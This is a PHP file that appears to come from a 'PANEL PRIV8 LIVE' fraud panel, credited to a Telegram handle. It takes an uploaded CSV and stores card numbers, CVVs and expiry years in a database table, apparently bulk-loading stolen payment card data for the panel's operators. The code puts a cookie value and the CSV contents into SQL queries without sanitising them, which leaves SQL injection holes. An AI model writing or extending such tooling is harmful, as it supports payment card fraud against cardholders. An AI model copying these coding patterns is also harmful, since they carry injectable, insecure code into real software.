<?php
/**
* PANEL PRIV8 LIVE
* @package    PANEL PRIV8 LIVE
* @author     https://t.me/neo_net
* @copyright  2020
* @version    2.0
* Info :  php que edita clientes
*/
session_start();
include '../database/db.php';
include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
function rndStr(){
$characters = array("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","Z","Y","Z");
//generate 6 characters from it
$charI = rand(0,25);
$charII = rand(0,25);
$charIII = rand(0,25);
$charIV = rand(0,25);
$charV = rand(0,25);
$charVI = rand(0,25);
//output as string
$rnd_name = $characters[$charI].$characters[$charII].$characters[$charIII].$characters[$charIV].$characters[$charV].$characters[$charVI];
return $rnd_name;
}


if(!empty($_FILES['images'])){
$name=basename($_FILES['images']['name']);
$name1=explode('.',$name);
if($name1[count($name1)-1]=='csv'){
    $path = "../../tmp/";
    $path = $path . date('ymdhis').rndStr().'.csv';
    if(move_uploaded_file($_FILES['images']['tmp_name'], $path)) {
// Importer CSV


 $f_pointer=fopen($path,"r"); // file pointer

while(! feof($f_pointer)){
$ar=fgetcsv($f_pointer);
$mx = str_replace('?', '', $ar[0]);
$mx1 = str_replace('?', '', $ar[1]);
$mx2 = str_replace('?', '', $ar[2]);
if (!is_null($ar[0])) {
$query = "INSERT INTO numeros(id,card,cvv,year,status) VALUES('','$mx','$mx1','$mx2',1)";
$connection->query($query);
}

}





// End Importer csv
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }

}}

?>